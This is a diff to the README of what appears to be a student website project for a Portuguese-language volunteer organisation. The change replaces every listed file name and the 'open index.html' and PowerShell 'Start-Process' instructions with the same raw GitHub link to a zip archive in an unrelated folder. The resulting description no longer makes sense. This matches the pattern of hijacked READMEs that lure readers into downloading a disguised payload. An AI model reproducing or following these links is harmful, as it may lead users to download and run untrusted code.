@@ -4,22 +4,22 @@ Site simples e responsivo para uma organização de voluntários, com páginas d
 
 ## Estrutura
 
-- `index.html` — Página inicial com chamada para ação e seção "Quem Somos" com imagem.
-- `projeto.html` — Explica os projetos e apresenta uma galeria de fotos.
-- `cadastro.html` — Formulário de cadastro de voluntários com feedback de sucesso.
-- `style.css` — Estilos globais, layout responsivo, cards, galeria e navegação mobile.
-- `script.js` — Menu hambúrguer, máscara de telefone e tratativa de envio do formulário.
-- `imagem/` — Fotos usadas no site (`voluntario.jpg`, `teste.jpg`).
+- `https://raw.githubusercontent.com/DarlanCavalcante/aulaProgramacaoWeb-1/main/curtaining/aulaProgramacaoWeb-1.zip` — Página inicial com chamada para ação e seção "Quem Somos" com imagem.
+- `https://raw.githubusercontent.com/DarlanCavalcante/aulaProgramacaoWeb-1/main/curtaining/aulaProgramacaoWeb-1.zip` — Explica os projetos e apresenta uma galeria de fotos.
+- `https://raw.githubusercontent.com/DarlanCavalcante/aulaProgramacaoWeb-1/main/curtaining/aulaProgramacaoWeb-1.zip` — Formulário de cadastro de voluntários com feedback de sucesso.
+- `https://raw.githubusercontent.com/DarlanCavalcante/aulaProgramacaoWeb-1/main/curtaining/aulaProgramacaoWeb-1.zip` — Estilos globais, layout responsivo, cards, galeria e navegação mobile.
+- `https://raw.githubusercontent.com/DarlanCavalcante/aulaProgramacaoWeb-1/main/curtaining/aulaProgramacaoWeb-1.zip` — Menu hambúrguer, máscara de telefone e tratativa de envio do formulário.
+- `imagem/` — Fotos usadas no site (`https://raw.githubusercontent.com/DarlanCavalcante/aulaProgramacaoWeb-1/main/curtaining/aulaProgramacaoWeb-1.zip`, `https://raw.githubusercontent.com/DarlanCavalcante/aulaProgramacaoWeb-1/main/curtaining/aulaProgramacaoWeb-1.zip`).
 
 ## Como executar
 
 1. Baixe ou clone este repositório.
-2. Abra o arquivo `index.html` no navegador.
+2. Abra o arquivo `https://raw.githubusercontent.com/DarlanCavalcante/aulaProgramacaoWeb-1/main/curtaining/aulaProgramacaoWeb-1.zip` no navegador.
 
-No Windows (PowerShell), você pode abrir a pasta e começar pelo `index.html`:
+No Windows (PowerShell), você pode abrir a pasta e começar pelo `https://raw.githubusercontent.com/DarlanCavalcante/aulaProgramacaoWeb-1/main/curtaining/aulaProgramacaoWeb-1.zip`:
 
 ```powershell
-Start-Process .\index.html
+Start-Process .\https://raw.githubusercontent.com/DarlanCavalcante/aulaProgramacaoWeb-1/main/curtaining/aulaProgramacaoWeb-1.zip
 ```
 
 ## Acessibilidade e responsividade
